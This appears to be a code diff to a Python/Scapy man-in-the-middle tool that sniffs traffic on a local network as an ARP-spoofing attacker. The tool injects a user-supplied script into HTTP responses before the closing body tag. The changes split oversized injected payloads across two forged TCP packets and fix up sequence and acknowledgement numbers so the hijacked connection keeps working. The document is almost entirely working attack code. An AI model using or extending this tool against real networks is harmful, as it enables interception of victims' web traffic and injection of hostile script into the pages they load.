@@ -69,9 +69,12 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 
 
 tcpStates = dict()
-
+mtu = 1480
+header_length = len(IP(dst='1.1.1.1') / TCP(dport=80))
+max_length = mtu - header_length
 
 def faketcp(packet):
+    global attackerMAC
     try:
         del packet[IP].len
         del packet[IP].chksum
@@ -79,8 +82,10 @@ def faketcp(packet):
         state = (packet[TCP].sport+packet[TCP].dport)
         if state not in tcpStates:
             debug(f'Initialize {packet[TCP].sport}->{packet[TCP].dport}')
-            tcpStates[state] = {'nb_more': 0, 'fin': 0}
+            tcpStates[state] = {'nb_more': 0, 'fin': 0, 'split_packet': 0, 'second_load_len': 0}
 
+        print('Seq:', packet.seq, 'Ack:', packet.ack)
+        packets = [packet]
         if packet.haslayer(Raw):
             oldlen = len(packet[Raw].load)
             load = packet[Raw].load.decode('utf-8')
@@ -96,15 +101,33 @@ def faketcp(packet):
             target = re.compile(re.escape('</body>'), re.IGNORECASE)
             script = f'<script>{args.script}</script></body>'
             load = target.sub(script, load)
-            packet[Raw].load = load.encode('utf-8')
+            if len(load) <= max_length:
+                packet[Raw].load = load.encode('utf-8')
+                packets = [packet]
+            else:
+                first_load = load[:max_length]
+                second_load = load[max_length:]
+                packet[Raw].load = first_load.encode('utf-8')
+                second_packet = Ether(src=attackerMAC) / IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, flags='A', seq=packet[TCP].seq + len(first_load), ack=packet[TCP].ack) / Raw(load=second_load.encode('utf-8'))
+                tcpStates[state]['split_packet'] = 1
+                tcpStates[state]['second_load_len'] = len(second_load)
+                packets = [packet, second_packet]
 
-            len_more = len(packet[Raw].load) - oldlen
+            len_more = len(load) - oldlen
             debug(f'Len more: {len_more}')
 
         if packet[TCP].seq!=1 and packet[TCP].sport==80:
             packet.seq += tcpStates[state]['nb_more']
+            if len(packets) > 1:
+                packets[1].seq += tcpStates[state]['nb_more']
         if packet[TCP].flags.A and packet[TCP].dport==80:
             packet.ack -= tcpStates[state]['nb_more']
+            if tcpStates[state]['split_packet'] == 1:
+                tcpStates[state]['split_packet'] = 2
+                packet.ack += tcpStates[state]['second_load_len']
+                tcpStates[state]['second_load_len'] = 0
+            elif tcpStates[state]['split_packet'] == 2:
+                tcpStates[state]['split_packet'] = 0
 
         if packet.haslayer(Raw):
             tcpStates[state]['nb_more'] += len_more
@@ -115,13 +138,11 @@ def faketcp(packet):
             flag = packet[TCP].flags
             if flag.F: tcpStates[state]['fin']+=1
 
-
-        return [packet]
+        return packets
     except Exception as e:
         debug(f'Error in faketcp: {e}')
         traceback.print_exc()
-        print(tcpStates)
-        return packet
+        return [packet]
 
 
 def handle_packet(p):
@@ -133,7 +154,6 @@ def handle_packet(p):
         if p[Ether].src != attackerMAC and p.haslayer(TCP):
             debug(f'Sniffed: {p.summary()}')
             ps = faketcp(p)
-            if p == None: return
 
         for p in ps:
             p[Ether].src = attackerMAC
